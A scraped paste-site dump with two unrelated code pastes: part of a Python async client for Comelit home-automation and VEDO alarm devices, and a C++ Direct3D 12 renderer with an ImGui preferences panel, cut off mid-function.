    async def _translate_device_status(self, dev_type: str, dev_status: int) -> str:
        """"""Makes status human readable.""""""

        if dev_type == COVER:
            return STATE_COVER[dev_status]

        return ""on"" if dev_status == STATE_ON else ""off""

    async def set_device_status(
        self, device_type: str, index: int, action: int
    ) -> bool:
        """"""Set device action.

        action:
            0 = off/close
            1 = on/open

        """"""
        reply_status = await self._get_page_result(
            f""/user/action.cgi?type={device_type}&num{action}={index}"", False
        )
        return reply_status == 200

    async def get_device_status(self, device_type: str, index: int) -> int:
        """"""Get device status.""""""
        reply_status, reply_json = await self._get_page_result(
            f""/user/icon_status.json?type={device_type}""
        )
        _LOGGER.debug(
            ""Device %s[%s] status: %s"", device_type, index, reply_json[""status""][index]
        )
        return reply_json[""status""][index]

    async def login(self) -> bool:
        """"""Login to Serial Bridge device.""""""
        payload = {""dom"": self.device_pin}
        return await self._login(payload, BRIDGE)

    async def get_all_devices(self) -> dict[str, dict[int, ComelitSerialBridgeObject]]:
        """"""Get all connected devices.""""""

        _LOGGER.debug(""Getting all devices for host %s"", self.host)

        loop = asyncio.get_running_loop()
        ureg = await loop.run_in_executor(
            None, functools.partial(pint.UnitRegistry, cache_folder="":auto:"")
        )
        ureg.default_format = ""~""

        for dev_type in (CLIMATE, COVER, LIGHT, IRRIGATION, OTHER, SCENARIO):
            reply_status, reply_json = await self._get_page_result(
                f""/user/icon_desc.json?type={dev_type}""
            )
            _LOGGER.debug(
                ""List of devices of type %s: %s"",
                dev_type,
                reply_json,
            )
            reply_counter_json: dict[str, Any] = {}
            if dev_type == OTHER and reply_json[""num""] > 0:
                reply_status, reply_counter_json = await self._get_page_result(
                    ""/user/counter.json""
                )
            devices = {}
            for i in range(reply_json[""num""]):
                # Guard against ""scenario"", that has 32 devices even if none is configured
                if reply_json[""desc""][i] == """":
                    continue
                status = reply_json[""status""][i]
                power = 0.0
                if instant_values := reply_counter_json.get(""instant""):
                    instant = ureg(instant_values[i])
                    if not instant.dimensionless:
                        power = ureg.convert(
                            instant.magnitude, str(instant.units), WATT
                        )
                dev_info = ComelitSerialBridgeObject(
                    index=i,
                    name=reply_json[""desc""][i],
                    status=status,
                    human_status=await self._translate_device_status(dev_type, status),
                    type=dev_type,
                    val=reply_json[""val""][i],
                    protected=reply_json[""protected""][i],
                    zone=reply_json[""env_desc""][reply_json[""env""][i]]
                    if not dev_type == SCENARIO
                    else """",
                    power=power,
                )
                devices.update({i: dev_info})
            self._devices.update({dev_type: devices})

        return self._devices


class ComelitVedoApi(ComelitCommonApi):
    """"""Queries Comelit SimpleHome VEDO alarm.""""""

    async def _translate_zone_status(
        self, zone: ComelitVedoZoneObject
    ) -> AlarmZoneState:
        """"""Translate ZONE status.""""""

        for status in ALARM_ZONE_STATUS:
            if zone.status & status != 0:
                return ALARM_ZONE_STATUS[status]

        return AlarmZoneState.REST

    async def _translate_area_status(
        self, area: ComelitVedoAreaObject
    ) -> AlarmAreaState:
        """"""Translate AREA status.""""""

        for field in ALARM_AREA_STATUS:
            if getattr(area, field):
                return ALARM_AREA_STATUS[field]

        return AlarmAreaState.DISARMED

    async def _create_area_object(
        self, json_area_desc: dict[str, Any], json_area_stat: dict[str, Any], index: int
    ) -> ComelitVedoAreaObject:
        """"""Get area status.""""""

        area = ComelitVedoAreaObject(
            index=index,
            name=json_area_desc[""description""][index],
            p1=json_area_desc[""p1_pres""][index],
            p2=json_area_desc[""p2_pres""][index],
            ready=json_area_stat[""ready""][index],
            armed=json_area_stat[""armed""][index],
            alarm=json_area_stat[""alarm""][index],
            alarm_memory=json_area_stat[""alarm_memory""][index],
            sabotage=json_area_stat[""sabotage""][index],
            anomaly=json_area_stat[""anomaly""][index],
            in_time=json_area_stat[""in_time""][index],
            out_time=json_area_stat[""out_time""][index],
            human_status=AlarmAreaState.UNKNOWN,
        )
        area.human_status = await self._translate_area_status(area)
        _LOGGER.debug(area)
        return area

    async def _create_zone_object(
        self, json_zone_desc: dict[str, Any], json_zone_stat: dict[str, Any], index: int
    ) -> ComelitVedoZoneObject:
        """"""Create zone object.""""""

        status_api = json_zone_stat[""status""].split("","")[index]

        zone = ComelitVedoZoneObject(
            index=index,
            name=json_zone_desc[""description""][index],
            status=int(status_api, 16),
            status_api=status_api,
            human_status=AlarmZoneState.UNKNOWN,
        )
        zone.human_status = await self._translate_zone_status(zone)
        _LOGGER.debug(zone)
        return zone

    async def set_zone_status(
        self, index: int, action: str, force: bool = False
    ) -> bool:
        """"""Set zone action.

        action:
            tot = enable
            dis = disable

        index:
            32 = all zones
             n = specific zone

        force:
            False = don't force action
            True  = force action

        """"""

        reply_status = await self._get_page_result(
            f""/action.cgi?vedo=1&{action}={index}&force={int(force)}"", False
        )
        return reply_status == 200

    async def login(self) -> bool:
        """"""Login to VEDO system.""""""
        payload = {""code"": self.device_pin}
        return await self._login(payload, VEDO)

    async def get_area_status(
        self, area: ComelitVedoAreaObject
    ) -> ComelitVedoAreaObject:
        """"""Get AREA status.""""""
        reply_status, reply_json_area_stat = await self._get_page_result(
            ""/user/area_stat.json""
        )
        _LOGGER.debug(""Alarm AREA statistics: %s"", reply_json_area_stat)

        description = {""description"": area.name, ""p1_pres"": area.p1, ""p2_pres"": area.p2}

        return await self._create_area_object(
            description, reply_json_area_stat, area.index
        )

    async def get_all_areas_and_zones(
        self,
    ) -> dict[str, dict[int, Any]]:
        """"""Get all VEDO system AREA and ZONE.""""""

        queries = {
            1: {""desc"": ""AREA description"", ""page"": ""/user/area_desc.json""},
            2: {""desc"": ""ZONE description"", ""page"": ""/user/zone_desc.json""},
            3: {""desc"": ""AREA statistics"", ""page"": ""/user/area_stat.json""},
            4: {""desc"": ""ZONE statistics"", ""page"": ""/user/zone_stat.json""},
        }
        reply_json_data: list[dict[Any, Any]] = []

        for info in queries.values():
            reply_status, reply_json = await self._get_page_result(info[""page""])
            _LOGGER.debug(""Alarm %s: %s"", info[""desc""], reply_json)
            if not reply_json[""logged""]:
                _LOGGER.warning(""VEDO host %s require cookie refresh"", self.host)
                raise CannotRetrieveData
            reply_json_data.append(reply_json)

        list_areas: list[int] = reply_json_data[0][""present""]
        areas = {}
        for i in range(len(list_areas)):
            if not list_areas[i]:
                _LOGGER.debug(""Alarm skipping non present AREA [%i]"", i)
                continue
            area = await self._create_area_object(
                reply_json_data[0], reply_json_data[2], i
            )
            areas.update({i: area})

        list_zones: list[int] = reply_json_data[1][""in_area""]
        zones = {}
        for i in range(len(list_zones)):
            if not list_zones[i]:
                _LOGGER.debug(""Alarm skipping non present ZONE [%i]"", i)
                continue
            zone = await self._create_zone_object(
                reply_json_data[1], reply_json_data[3], i
            )
            zones.update({i: zone})

        return {ALARM_AREAS: areas, ALARM_ZONES: zones}
"
QjtVdkf5,Untitled,Zgragselus,C++,Sunday 7th of January 2024 10:16:18 AM CDT,"///////////////////////////////////////////////////////////////////////////////////////////////////
//
// Renderer.cpp
// 
///////////////////////////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////////////////////////
// Header section

#include ""Game/Loader/Assimp.h""
#include ""Renderer.h""
#include <Graphics/System/MaterialSystem.h>

///////////////////////////////////////////////////////////////////////////////////////////////////
// Declaration section

///////////////////////////////////////////////////////////////////////////////////////////////////
// Definition section

/// <summary>
/// Parametric constructor.
/// 
/// Builds renderer and sets everything up.
/// </summary>
/// <param name=""engine"">Pointer to Engine instance</param>
/// <param name=""eventSystem"">Pointer to event system instance</param>
/// <param name=""options"">Pointer to configuration instance</param>
/// <param name=""log"">Pointer to logging system</param>
/// <param name=""renderer"">Pointer to Direct3D 12 renderer</param>
/// <param name=""swapChain"">Pointer to Swap chain for window</param>
/// <param name=""appState"">Pointer to Scmdl class instance (holding state/values for application)</param>
Renderer::Renderer(Engine::Core* engine, Engine::EventSystem* eventSystem, Engine::Constants* options, Engine::Log* log, Engine::D3DRenderer* renderer, Engine::D3DSwapChain* swapChain, Application* appState) :
	Engine::System(""Renderer"", eventSystem),
	mOptions(options),
	mLog(log),
	mRenderer(renderer),
	mSwapChain(swapChain),
	mAppState(appState)
{
	// Run in background
	EnableUpdater(Engine::Task::BACKGROUND_SYNC_REPEATING);

	// Create compute/render pipeline
	mPipeline = new Engine::ComputeGraph(engine);

	// Create render nodes
	
	// Compute ray tracer - ray generator
	Engine::ComputeGraphNode* mRaygenNode = new Engine::ComputeGraphNode(""Raytracer::Raygen"", eventSystem, [&]() -> void 
		{
			Engine::ComputeContext* context = mRenderer->GetComputeContext();
			
			context->Begin();
			
			mAppState->mGfxProfiler->BeginProfile(context, ""Raytracer::Raygen"");
			mAppState->mRayGenerator->InitPrimaryRaysDevice(mAppState->mRayBuffer, context, mRenderer->Heap(), mAppState->mScene->GetEntity(""Camera""), mAppState->mViewportWidth, mAppState->mViewportHeight);
			mAppState->mGfxProfiler->EndProfile(context, ""Raytracer::Raygen"");
			
			context->Finish();
		});

	// Compute ray tracer - trace rays
	Engine::ComputeGraphNode* mRaytraceNode = new Engine::ComputeGraphNode(""Raytracer::Trace"", eventSystem, [&]() -> void
		{
			Engine::ComputeContext* context = mRenderer->GetComputeContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""Raytracer::Trace"");
			mRaytracerPass->SetSources(mAppState->mRayBuffer, mAppState->mSceneBuffer, mAppState->mAggregate);
			mRaytracerPass->Process(mRenderer->Heap(), context, mAppState->mRenderNodes->GetBounds(), mAppState->mRaytracerInitialized);
			mAppState->mGfxProfiler->EndProfile(context, ""Raytracer::Trace"");

			context->Finish();
		});
	mRaytraceNode->AddInput(mRaygenNode);

	// Hardware ray tracer
	Engine::ComputeGraphNode* mRaytraceHWNode = new Engine::ComputeGraphNode(""DXRPass"", eventSystem, [&]() -> void
		{
			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""DXRPass"");
			mRaytracerPassHW->SetSources(mAppState->mScene);
			mRaytracerPassHW->Process(mRenderer->Heap(), context, mAppState->mScene->GetEntity(""Camera""), mAppState->mViewportWidth, mAppState->mViewportHeight);
			mAppState->mGfxProfiler->EndProfile(context, ""DXRPass"");

			context->Finish();
		});

	// Prepare scenegraph render nodes into buffer (for rendering)
	Engine::ComputeGraphNode* mRenderNodesNode = new Engine::ComputeGraphNode(""RenderNodesPass"", eventSystem, [&]() -> void
		{
			Engine::ComputeContext* context = mRenderer->GetComputeContext();

			context->Begin();

			mAppState->mRenderNodes->Process(context);

			context->Finish();
		});

	// Prepare material systems data into buffer (for rendering)
	Engine::ComputeGraphNode* mMaterialNode = new Engine::ComputeGraphNode(""MaterialPass"", eventSystem, [&]() -> void
		{
			Engine::ComputeContext* context = mRenderer->GetComputeContext();

			context->Begin();

			// If anything in editor was changed - check whether the object has material component, if it has - material system needs to be updated for this change
			if (mAppState->mEditor->GetChangedFlag())
			{
				std::set<int> ids = mAppState->mScene->GetState()->GetSelection();
				for (std::set<int>::iterator it = ids.begin(); it != ids.end(); it++)
				{
					Engine::Entity* entity = mAppState->mScene->GetEntity(*it);
					if (entity->GameObject().Has<Engine::MaterialComponent>())
					{
						Engine::MaterialComponent* materialComponent = entity->GameObject().Get<Engine::MaterialComponent>();
						int materialID = materialComponent->GetMaterialID();

						SkyeCuillin::MaterialSystem::Material* material = mAppState->mMaterialSystem->GetMaterial(materialID);

						material->mDiffuseMap = materialComponent->GetDiffuseMap()->GetSRVIndex();
						if (material->mDiffuseMap == (unsigned int)-1)
						{
							material->mDiffuseMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::DIFFUSE]->GetSRVIndex();
						}

						material->mNormalsMap = materialComponent->GetNormalsMap()->GetSRVIndex();
						if (material->mNormalsMap == (unsigned int)-1)
						{
							material->mNormalsMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::NORMAL]->GetSRVIndex();
						}

						material->mMetallicMap = materialComponent->GetMetallicMap()->GetSRVIndex();
						if (material->mMetallicMap == (unsigned int)-1)
						{
							material->mMetallicMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::METALLIC]->GetSRVIndex();
						}

						material->mRoughnessMap = materialComponent->GetRoughnessMap()->GetSRVIndex();
						if (material->mRoughnessMap == (unsigned int)-1)
						{
							material->mRoughnessMap = mAppState->mDefault[(unsigned int)Application::DefaultTextures::ROUGHNESS]->GetSRVIndex();
						}

						mAppState->mMaterialSystem->UpdateMaterial(materialID);
					}
				}
			}

			mAppState->mMaterialSystem->Process(context);

			context->Finish();
		});

	// Render all shadow maps in lighting system that need to be updated
	Engine::ComputeGraphNode* mShadowRenderNode = new Engine::ComputeGraphNode(""ShadowPass"", eventSystem, [&]() -> void
		{
			std::lock_guard<std::mutex> lock(mAppState->mRenderingMutex);

			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();

			mAppState->mGfxProfiler->BeginProfile(context, ""ShadowPass"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				break;

			case Application::ViewportState::TEXTURED:
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mLightingSystem->Process(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mAppState->mRenderNodes->GetBounds());
				break;

			default:
				break;
			}
			mAppState->mGfxProfiler->EndProfile(context, ""ShadowPass"");

			context->Finish();
		});
	mShadowRenderNode->AddInput(mRenderNodesNode);
	mShadowRenderNode->AddInput(mMaterialNode);

	mRenderNode = new Engine::ComputeGraphNode(""Rendering"", eventSystem, [&]() -> void
		{
			std::lock_guard<std::mutex> lock(mAppState->mRenderingMutex);

			Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

			context->Begin();			

			mAppState->SetGraphicsContext(context);

			mAppState->mGfxProfiler->Reset(context);
			mAppState->mGfxProfiler->BeginProfile(context, ""Frame"");

			/*context->SetDescriptorHeap(Engine::DescriptorHeap::CBV_SRV_UAV, mRenderer->Heap());
			context->TransitionResource(mSwapChain->GetBackBuffer(), D3D12_RESOURCE_STATE_RENDER_TARGET, true);
			context->SetRenderTargets(mSwapChain->GetBackBuffer(), mSwapChain->GetDepthBuffer());
			context->SetViewport(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->SetScissorRect(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->ClearColor(mSwapChain->GetBackBuffer(), 0.0f, 0.0f, 0.0f, 1.0f);
			context->ClearDepth(mSwapChain->GetDepthBuffer(), 1.0f, 0);*/

			Engine::Camera* cam = mAppState->mScene->GetEntity(""Camera"")->GameObject().Get<Engine::CameraComponent>()->GetCamera();

			mAppState->mGfxProfiler->BeginProfile(context, ""CullPassHiZ"");
			mCulling->SetBuffers(mAppState->mRenderNodes, cam->GetFrustum(), Engine::Culling::DEFAULT_CULLING_BUFFER, mAppState->mScene->GetEntity(""Camera""));
			mCulling->Process(mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""CullPassHiZ"");

			mAppState->mGfxProfiler->BeginProfile(context, ""Hi-ZPass1"");
			mHiZPass->Process(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
			mAppState->mGfxProfiler->EndProfile(context, ""Hi-ZPass1"");
			mAppState->mGfxProfiler->BeginProfile(context, ""Hi-ZPass2"");
			mHiZPass->Process2(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
			mAppState->mGfxProfiler->EndProfile(context, ""Hi-ZPass2"");

			mAppState->mGfxProfiler->BeginProfile(context, ""CullPass"");
			//mCulling->SetBuffers(mAppState->mRenderNodes, f, SkyeCuillin::Culling::DEFAULT_CULLING_BUFFER, mAppState->mScene->GetEntity(""Camera""), mHiZPass->GetWidth(), mHiZPass->GetHeight(), mHiZPass->GetNumMiplevels());
			mCulling->SetBuffers(mAppState->mRenderNodes, cam->GetFrustum(), Engine::Culling::DEFAULT_CULLING_BUFFER, mAppState->mScene->GetEntity(""Camera""), mHiZPass->GetWidth(), mHiZPass->GetHeight(), mHiZPass->GetNumMiplevels());
			mCulling->Process(mRenderer->Heap(), context, Engine::Culling::DEFAULT_CULLING_BUFFER, mHiZPass->GetBuffer());
			//mCulling->SetBuffers(mAppState->mRenderNodes, cam->GetFrustum(), mAppState->mScene->GetEntity(""Camera""));
			//mCulling->Process(mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""CullPass"");

			mAppState->mGfxProfiler->BeginProfile(context, ""DrawPass"");

			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				//mWireframePass->Process(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context, mAppState->mRenderNodes, mCulling);
				mWireframePass->Process(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context, mAppState->mRenderNodes, mCulling);
				break;

			case Application::ViewportState::TEXTURED:
				mTexturedPass->Process(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mGBufferPass->Process(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context, mAppState->mRenderNodes, mAppState->mMaterialSystem->GetMaterialsBuffer(), mCulling);
				break;

			default:
				break;
			}
			mAppState->mGfxProfiler->EndProfile(context, ""DrawPass"");

			// TODO: This should be moved to place after all render nodes are used
			mAppState->mRenderNodes->Clean(context);

			mAppState->mGfxProfiler->BeginProfile(context, ""NativeResolve"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mNativeResolvePass->SetSources(mWireframePass->GetBuffer(), mWireframePass->GetDepthBuffer());
				break;

			case Application::ViewportState::TEXTURED:
				mNativeResolvePass->SetSources(mTexturedPass->GetBuffer(), mTexturedPass->GetDepthBuffer());
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mNativeResolvePass->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER), mGBufferPass->GetDepthBuffer());
				break;

			default:
				break;
			}
			mNativeResolvePass->Process(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""NativeResolve"");

			mAppState->mGfxProfiler->BeginProfile(context, ""ReductionPass"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mMultisampling->SetSources(mWireframePass->GetBuffer(), mWireframePass->GetDepthBuffer());
				break;

			case Application::ViewportState::TEXTURED:
				mMultisampling->SetSources(mTexturedPass->GetBuffer(), mTexturedPass->GetDepthBuffer());
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mMultisampling->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER), mGBufferPass->GetDepthBuffer());
				break;

			default:
				break;
			}
			mMultisampling->Process(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""ReductionPass"");

			mAppState->mGfxProfiler->BeginProfile(context, ""ResolvePass"");
			switch (mAppState->GetViewportState())
			{
			case Application::ViewportState::WIREFRAME:
				mResolve->SetSources(mWireframePass->GetBuffer(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				break;

			case Application::ViewportState::TEXTURED:
				mResolve->SetSources(mTexturedPass->GetBuffer(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				break;

			case Application::ViewportState::LIT_TEXTURED:
			case Application::ViewportState::LIT:
				mLightingPass->SetSources(mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::COLOR_BUFFER),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::NORMAL_BUFFER),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::DEPTH_BUFFER),
					mMultisampling->GetTilesCount(),
					mMultisampling->GetTiles(),
					mMultisampling->GetTileRecords(),
					mMultisampling->GetTileSamples());
				mLightingPass->Process(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context);

				mAvgLuminance->SetSources(mLightingPass->GetOutput(), mMultisampling->GetTiles(), mMultisampling->GetTilesCount(), mMultisampling->GetTileRecords(), mMultisampling->GetTileSamples());
				mAvgLuminance->Process(mRenderer->Heap(), context, mAppState->mDeltaTime);

				mResolve->SetSources(mLightingPass->GetOutput(),
					mGBufferPass->GetBuffer(Engine::GBuffer::Buffer::COLOR_BUFFER),
					mMultisampling->GetTiles(),
					mMultisampling->GetTilesCount(),
					mMultisampling->GetTileRecords(),
					mMultisampling->GetTileSamples(),
					mAvgLuminance->GetAvgLuminanceBuffer());
				break;

			default:
				break;
			}
			mResolve->Process(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context);
			mAppState->mGfxProfiler->EndProfile(context, ""ResolvePass"");

			context->TransitionResource(mSwapChain->GetBackBuffer(), D3D12_RESOURCE_STATE_RENDER_TARGET, true);
			context->SetRenderTargets(mSwapChain->GetBackBuffer(), mSwapChain->GetDepthBuffer());
			context->SetViewport(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->SetScissorRect(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->ClearColor(mSwapChain->GetBackBuffer(), 0.0f, 0.0f, 0.0f, 1.0f);
			context->ClearDepth(mSwapChain->GetDepthBuffer(), 1.0f, 0);

			std::set<int> ids;
			Engine::float4 basis[3] = { Engine::float4(1.0f, 0.0f, 0.0f, 1.0f), Engine::float4(0.0f, 1.0f, 0.0f, 1.0f), Engine::float4(0.0f, 0.0f, 1.0f, 1.0f) };
			mGizmoPass->Clear();
			//mGizmoPass->Process(nodes, mAppState->mScene, mMatricesBuffer, ids);
			//mGizmoPass->ProcessIcons(nodes);
			mGizmoPass->AddTranslationAxis(Engine::float4(0.0f, 0.0f, 0.0f, 1.0f), basis, 10.0f, -1, -1);
			mGizmoPass->Render(mAppState->mScene->GetEntity(""Camera""), mRenderer->Heap(), context);
			
			context->SetDescriptorHeap(Engine::DescriptorHeap::CBV_SRV_UAV, mRenderer->Heap());
			context->TransitionResource(mSwapChain->GetBackBuffer(), D3D12_RESOURCE_STATE_RENDER_TARGET, true);
			context->SetRenderTargets(mSwapChain->GetBackBuffer(), mSwapChain->GetDepthBuffer());
			context->SetViewport(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->SetScissorRect(0.0f, 0.0f, (float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y);
			context->ClearColor(mSwapChain->GetBackBuffer(), 0.0f, 0.0f, 0.0f, 1.0f);
			context->ClearDepth(mSwapChain->GetDepthBuffer(), 1.0f, 0);

			// Draw Imgui user interface
			mImgui->Update(context, 1.0f / 60.0f);
			mImgui->NewFrame();

			mAppState->mMenuUI->Process(mAppState->mWindowSize);


			// Create root imgui window for dockspace
			ImGuiViewport* viewport = ImGui::GetMainViewport();
			ImGui::SetNextWindowPos(ImVec2(0.0f, 0.0f));
			ImGui::SetNextWindowSize(ImVec2((float)mAppState->mWindowSize.x, (float)mAppState->mWindowSize.y));
			ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
			ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
			ImGui::Begin(""Viewport"", nullptr, ImGuiWindowFlags_MenuBar | ImGuiWindowFlags_NoDocking | ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoBringToFrontOnFocus | ImGuiWindowFlags_NoNavFocus | ImGuiWindowFlags_NoBackground);
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();
			ImGui::PopStyleVar();

			ImGuiID dockspace = ImGui::GetID(""Dockspace"");
			ImGui::DockSpace(dockspace, ImVec2(0.0f, 0.0f), ImGuiDockNodeFlags_None | ImGuiDockNodeFlags_PassthruCentralNode);

			if (mAppState->mEditorPreferences)
			{
				ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
				ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
				ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
				if (ImGui::Begin(""Preferences"", &mAppState->mEditorPreferences, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoDocking))
				{
					bool changed = false;

					// Visual style section
					ImGui::SeparatorText(""Editor Style"");

					const char* styles[] = { ""Light"", ""Dark"" };
					int styleCurrent = mOptions->Get<int>(""Graphics.UI.Style"");
					changed |= ImGui::Combo(""Editor Style"", &styleCurrent, styles, IM_ARRAYSIZE(styles));

					float alpha = mOptions->Get<float>(""Graphics.UI.Alpha"");
					changed |= ImGui::DragFloat(""Editor Alpha"", &alpha, 0.05f, 0.0f, 1.0f);

					// Fonts section
					ImGui::SeparatorText(""Editor Fonts"");

					std::string defaultFontFile = mOptions->Get<std::string>(""Graphics.UI.Fonts.Default.Font"");
					int defaultFontSize = mOptions->Get<int>(""Graphics.UI.Fonts.Default.Size"");
					if (ImGui::TreeNodeEx(""Default Font"", ImGuiTreeNodeFlags_DefaultOpen))
					{
						if (ImGui::Button(defaultFontFile.c_str()))
						{
							std::string filename;
							bool open = Engine::FileDialog::Show(mLog, ""Select TrueType Font"", ""TrueType Font Files\0*.ttf\0All Files\0*.*\0"", Engine::FileDialog::Type::OPEN_FILE_DIALOG, filename);
							if (open)
							{
								defaultFontFile = filename;
								changed = true;
								mAppState->mEditorPreferencesFontFlag = true;
							}
						}

						if (ImGui::InputInt(""Font size"", &defaultFontSize, 1, 2))
						{
							changed = true;
							mAppState->mEditorPreferencesFontFlag = true;
						}

						ImGui::TreePop();
					}

					std::string iconsFontFile = mOptions->Get<std::string>(""Graphics.UI.Fonts.Icons.Font"");
					int iconsFontSize = mOptions->Get<int>(""Graphics.UI.Fonts.Icons.Size"");
					if (ImGui::TreeNodeEx(""Icons Font"", ImGuiTreeNodeFlags_DefaultOpen))
					{
						if (ImGui::Button(iconsFontFile.c_str()))
						{
							std::string filename;
							bool open = Engine::FileDialog::Show(mLog, ""Select TrueType Font"", ""TrueType Font Files\0*.ttf\0All Files\0*.*\0"", Engine::FileDialog::Type::OPEN_FILE_DIALOG, filename);
							if (open)
							{
								iconsFontFile = filename;
								changed = true;
								mAppState->mEditorPreferencesFontFlag = true;
							}
						}

						if (ImGui::InputInt(""Font size"", &iconsFontSize, 1, 2))
						{
							changed = true;
							mAppState->mEditorPreferencesFontFlag = true;
						}

						ImGui::TreePop();
					}

					std::string monospaceFontFile = mOptions->Get<std::string>(""Graphics.UI.Fonts.Monospace.Font"");
					int monospaceFontSize = mOptions->Get<int>(""Graphics.UI.Fonts.Monospace.Size"");
					if (ImGui::TreeNodeEx(""Monospace Font"", ImGuiTreeNodeFlags_DefaultOpen))
					{
						if (ImGui::Button(monospaceFontFile.c_str()))
						{
							std::string filename;
							bool open = Engine::FileDialog::Show(mLog, ""Select TrueType Font"", ""TrueType Font Files\0*.ttf\0All Files\0*.*\0"", Engine::FileDialog::Type::OPEN_FILE_DIALOG, filename);
							if (open)
							{
								monospaceFontFile = filename;
								changed = true;
								mAppState->mEditorPreferencesFontFlag = true;
							}
						}

						if (ImGui::InputInt(""Font size"", &monospaceFontSize, 1, 2))
						{
							changed = true;
							mAppState->mEditorPreferencesFontFlag = true;
						}

						ImGui::TreePop();
					}

					if (changed)
					{
						bool style = styleCurrent == 1 ? true : false;
						mImgui->SetupImGuiStyle(style, alpha);
						mOptions->Set<int>(""Graphics.UI.Style"", styleCurrent);
						mOptions->Set<float>(""Graphics.UI.Alpha"", alpha);

						mOptions->Set<std::string>(""Graphics.UI.Fonts.Default.Font"", defaultFontFile);
						mOptions->Set<int>(""Graphics.UI.Fonts.Default.Size"", defaultFontSize);

						mOptions->Set<std::string>(""Graphics.UI.Fonts.Icons.Font"", iconsFontFile);
						mOptions->Set<int>(""Graphics.UI.Fonts.Icons.Size"", iconsFontSize);

						mOptions->Set<std::string>(""Graphics.UI.Fonts.Monospace.Font"", monospaceFontFile);
						mOptions->Set<int>(""Graphics.UI.Fonts.Monospace.Size"", monospaceFontSize);
					}

					if (ImGui::Button(""Save""))
					{
						mOptions->Save(""../Data/Config/ConfigModel.conf"");
					}
				}
				ImGui::End();
				ImGui::PopStyleVar();
				ImGui::PopStyleVar();
				ImGui::PopStyleVar();
			}

			ImGui::End();

			unsigned int regionWidth = mAppState->mWindowSize.x;
			unsigned int regionHeight = mAppState->mWindowSize.y;

			if (ImGui::Begin(""Debug""))
			{
				//ImGui::Image((ImTextureID)(mGBufferPass->GetBuffer(0)->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				//ImGui::Image((ImTextureID)(mWireframePass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
				//ImGui::Image((ImTextureID)(mTexturedPass->GetBuffer()->GetSRV().mGpuHandle.ptr), ImGui::GetContentRegionAvail());
